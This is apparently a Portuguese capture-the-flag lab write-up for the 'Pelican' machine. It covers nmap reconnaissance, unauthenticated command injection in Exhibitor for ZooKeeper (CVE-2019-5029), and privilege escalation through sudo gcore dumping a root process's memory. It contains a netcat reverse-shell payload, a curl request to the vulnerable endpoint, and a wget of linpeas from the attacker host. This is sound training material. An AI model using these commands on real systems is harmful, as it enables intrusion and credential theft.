01 Reconhecimento

Dois scans de sempre: um TCP completo com versão e scripts, e um UDP separado nos top-ports pra não deixar nada de fora.

sudo nmap -T4 -A 192.168.107.98 -oN nmap.txt
nmap -sUV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 192.168.107.98 -Pn

Superfície encontrada

22/tcp    ssh        OpenSSH 7.9p1 Debian
139,445   smb        Samba 4.9.5-Debian (WORKGROUP)
631/tcp   ipp        CUPS 2.2
2181/tcp  zookeeper  Apache ZooKeeper 3.4.6
2222/tcp  ssh        OpenSSH 7.9p1 Debian
8080/tcp  http       Exhibitor for ZooKeeper (UI)
8081/tcp  http       nginx 1.14.2  ->  redirect p/ :8080/exhibitor/v1/ui/index.html
Host: PELICAN

O que me interessa: a 8081 redireciona direto pra uma UI de Exhibitor for ZooKeeper na 8080, e há um ZooKeeper na 2181. Aplicação com nome próprio é meio caminho andado.

02 Enumeração

Abri a UI no navegador pra confirmar o que o nmap apontou.

http://192.168.107.98:8080/exhibitor/v1/ui/index.html

Com o nome da aplicação em mãos, joguei no Google e caí no Exploit-DB.

searchsploit exhibitor
# ZooKeeper exploit -> Exhibitor Web UI 1.7.1 - Remote Code Execution

Li o exploit. Ele descreve duas formas de conseguir RCE não autenticado, e as duas exploram o mesmo ponto: o campo java.env script — texto que o Exhibitor salva e depois executa.

CVE-2019-5029 CWE-78 · OS Command Injection Crítico · não autenticado TALOS-2019-0790

03 Acesso inicial

Fui pela UI. No Config, coloquei a shell reversa apontando pro meu host no campo java.env script:

$(/bin/nc -e /bin/sh 192.168.45.167 4444 &)

Depois é só seguir a sequência que o Exhibitor pede pra aplicar a configuração:

1.  cola o payload no campo java.env script
2.  Editing        ->  ON
3.  Commit...
4.  All At Once
5.  OK   (leva até ~1 min pra executar)

Mesma coisa sem clicar em nada, direto no endpoint vulnerável:

curl -X POST -d @data.json http://192.168.107.98:8080/exhibitor/v1/config/set

Com o listener de pé, a conexão cai em alguns segundos. Sou o charles no host pelican.

sudo nc -nlvp 4444

Estabilizo a shell com o truque do pty e acho a local.txt na home do charles.

python3 -c 'import pty; pty.spawn("/bin/bash")'

04 Escalada de privilégios

Subi o linpeas com wget, dei permissão de execução e mandei ver.

wget http://192.168.45.167/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

O linpeas pinta de vermelho exatamente o que interessa: o charles pode rodar /usr/bin/gcore como root, sem senha.

sudo -l

O gcore pede um PID — ele tira uma "foto" da memória de um processo em execução.

O rabbit hole

Primeira reação: mirar no serviço que eu tinha acabado de explorar — o Java do Exhibitor. Criei um xterm pra ter mais espaço, rodei o top pra achar o PID e dumpei.

sudo gcore 505

Perdi tempo aqui. O detalhe que eu tinha deixado passar: o gcore roda como root. O prêmio não é o processo pelo qual eu entrei — é um processo de root que guarde algum segredo. Reli o ps com calma.

Um binário chamado password-store, de root. É esse que eu quero dumpar.

sudo gcore 494
strings core.494

Rodo strings no core e a senha do root aparece em texto puro na memória do processo:

charles@pelican:~$ strings core.494
...
/usr/bin/passwor
001 Password: root: ████████████   (redigido)
x86_64
/usr/bin/password-store

05 Prova

Com a senha recuperada da memória, su root resolve. Root na conta.

charles@pelican:~$ su root
Password:
root@pelican:/home/charles# id
uid=0(root) gid=0(root) groups=0(root)
root@pelican:/home/charles# cat /root/proof.txt
████████████████████████   (redigido)

Duas flags, root na conta. Os valores de flag e a senha ficam redigidos de propósito — o que vale aqui é o caminho, não o segredo do lab.

06 O que aprendi

gcore não "dá root" — ele dá uma cópia da memória de um processo. O poder está em pra onde você aponta. Rodando como root via sudo, o alvo certo é um processo de root que guarde segredo, não o serviço que você explorou pra entrar. Gastei minutos dumpando o Java do Exhibitor antes de reler o ps e enxergar o password-store ali, rodando como root, esperando. Ler a ferramenta e pensar no contexto de privilégio antes de disparar teria cortado o rabbit hole pela metade.
